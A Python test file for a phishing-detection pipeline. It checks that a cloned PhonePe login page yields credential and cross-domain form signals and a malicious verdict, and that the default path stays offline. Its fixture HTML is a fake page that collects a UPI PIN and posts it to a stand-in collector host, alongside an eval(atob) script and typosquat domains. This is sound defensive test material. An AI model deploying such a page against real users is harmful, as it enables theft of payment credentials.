"""Pipeline-level test: an injected clone-like FetchResult yields visual_similarity + behaviour signals."""
from app.services import pipeline
from app.services.fetcher import FetchResult


CLONE_HTML = """
<html><head><title>PhonePe Secure UPI</title></head><body>
<p>Login to PhonePe and enter your UPI PIN to make a secure payment via UPI wallet.</p>
<form action="https://collector.top/grab" method="post">
  <input name="upi_pin" type="password">
</form>
<script>eval(atob("eA=="));</script>
</body></html>
"""


def test_pipeline_sets_visual_similarity_and_behaviour_signals():
    result = FetchResult(
        url="http://ph0nepe-kyc.xyz/login", final_url="http://ph0nepe-kyc.xyz/login",
        redirect_chain=["http://ph0nepe-kyc.xyz/login"], status=200, html=CLONE_HTML, ok=True,
        favicon_hash="abc123def4567890",
        forms=[{"action": "https://collector.top/grab", "method": "post",
                "inputs": [{"name": "upi_pin", "type": "password"}]}],
    )
    cand = pipeline.analyze_url("http://ph0nepe-kyc.xyz/login", source="user_report",
                                fetch_result=result)

    assert cand.visual_similarity is not None and cand.visual_similarity > 0
    names = {s.name for s in cand.signals}
    assert "credential_input_fields" in names
    assert "cross_domain_form_action" in names
    assert 0.0 <= cand.risk_score <= 1.0
    assert cand.verdict == "malicious"
    # favicon_hash entity added for clustering.
    assert any(e.type == "favicon_hash" and e.value == "abc123def4567890" for e in cand.entities)


def test_pipeline_without_fetch_leaves_visual_none():
    cand = pipeline.analyze_url("http://ph0nepe-kyc-verify.xyz/login", source="user_report")
    assert cand.visual_similarity is None
    assert 0.0 <= cand.risk_score <= 1.0


def test_default_path_is_offline_no_fetch_no_enrich(monkeypatch):
    """With ANALYZE_FETCH unset and do_fetch=None, the default analyze_url path must NOT
    invoke the network fetcher or enrichment resolvers (the offline guarantee)."""
    from app.services import enrichment, fetcher

    # Force the module-level flag OFF regardless of the ambient environment.
    monkeypatch.setattr(pipeline, "ANALYZE_FETCH", False)

    def _boom_fetch(*args, **kwargs):
        raise AssertionError("fetcher.fetch must not be called on the offline default path")

    def _boom_enrich(*args, **kwargs):
        raise AssertionError("enrichment.enrich must not be called on the offline default path")

    monkeypatch.setattr(fetcher, "fetch", _boom_fetch)
    monkeypatch.setattr(enrichment, "enrich", _boom_enrich)

    cand = pipeline.analyze_url("http://phonepe-kyc-verify.xyz/login", source="user_report")
    # Lexical-only result: no visual similarity, no network-derived entities.
    assert cand.visual_similarity is None
    assert all(e.type in {"domain"} or e.type == "domain" for e in cand.entities)
    entity_types = {e.type for e in cand.entities}
    assert entity_types <= {"domain"}


def test_env_flag_enables_fetch(monkeypatch):
    """When ANALYZE_FETCH is on and do_fetch is left None, the fetcher IS consulted."""
    from app.services import enrichment, fetcher

    monkeypatch.setattr(pipeline, "ANALYZE_FETCH", True)
    calls = {"fetch": 0, "enrich": 0}

    def _stub_fetch(url, *a, **k):
        calls["fetch"] += 1
        return FetchResult(url=url, ok=False)

    def _stub_enrich(host, *a, **k):
        calls["enrich"] += 1
        return []

    monkeypatch.setattr(fetcher, "fetch", _stub_fetch)
    monkeypatch.setattr(enrichment, "enrich", _stub_enrich)

    pipeline.analyze_url("http://phonepe-kyc-verify.xyz/login", source="user_report")
    assert calls["fetch"] == 1
    assert calls["enrich"] == 1
